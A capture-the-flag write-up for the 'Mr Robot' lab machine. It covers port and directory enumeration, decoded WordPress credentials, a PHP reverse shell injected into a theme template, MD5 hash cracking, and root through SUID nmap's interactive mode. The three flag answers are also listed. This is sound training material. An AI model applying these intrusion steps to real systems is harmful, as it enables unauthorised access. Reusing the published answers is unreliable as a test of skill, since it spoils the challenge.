# Mr Robot CTF - Medium

<details>
<summary>Nmap scan</summary>

```shell
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
```

</details>
<br>

```shell
nmap -T4 -A 10.10.104.6

ffuf -u http://10.10.104.6/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s

#start listener
nc -nvlp 4445

#after getting shell access
cd /home

ls

cd robot

ls -la
#we have a key-2-of-3.txt and a MD5 hash file

#in attacker machine, crack hash
hashcat -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt

#in remote shell, stabilize shell
python -c 'import pty; pty.spawn("/bin/bash")'

su robot
#enter cracked pwd

cat key-2-of-3.txt

find / -perm -u=s -type f 2>/dev/null
#nmap
#there are multiple exploits, we will use the interactive feature

nmap --interactive

!sh
#gives root shell

cat /root/key-3-of-3.txt
```

```markdown
Based on the scan results, we have two websites to inspect, <http://10.10.104.6:80> and <https://10.10.104.6:443>

Both the websites have the same content, so we can continue with one for now.

The robots.txt file in the website shows the clue 'fsocity.dic', 'key-1-of-3.txt'

The latter file on the website gives us key 1, while the former is

Meanwhile we can scan for more directories in the website.

During enumeration, we get to know that WordPress 4.3.1 is being used for the website.

Other directories of interest are /robots, /readme, /image and /wp-login.php

The /license directory includes a clue "ZWxsaW90OkVSMjgtMDY1Mgo=" in the Inspect Tab.

We get the credentials "elliot:ER28-0652" by converting it from Base64.

Looking at the 'fsocity.dic' file, we can see it looks like a wordlist. But we have creds now.

The creds allow us to log into the Dashboard of the website.

Under the Users tab, we can view 2 of them - Elliot Anderson (elliot, elliot@mrrobot.com), with Admin privileges and krista Gordon (mich05654, kgordon@therapist.com), who is a Subscriber.

Now, as we have Admin access to WordPress dashboard, we can inject a PHP reverse-shell and get a shell on our listener.

There are multiple ways to do this; I did it by injecting reverse-shell code in the 404.php template, and get shell access.

Now, we get access but we cannot get the 2nd key yet as we do not have permission for user 'robot'.

However, there is a MD5 hash given to us for the user 'robot'.

Using hashcat, we can crack the hash and the password that we get is 'abcdefghijklmnopqrstuvwxyz'.

We can switch to 'robot' user now; but before that we need to upgrade our shell.

After upgrading and eventually switching to 'robot' and getting the 2nd key, we need to find the 3rd key.

Following the enumeration techniques for privilege escalation on Linux machines, we find programs with SUID bit set.

This gives us a bunch of programs, and it includes 'nmap'.

We can therefore attempt an exploit with the help of GTFObins, and use nmap to get root.
```

```markdown
1. What is key 1? - 073403c8a58a1f80d943455fb30724b9

2. What is key 2? - 822c73956184f694993bede3eb39f959

3. What is key 3? - 04787ddef27c3dee1ee161b21670b4e4
```
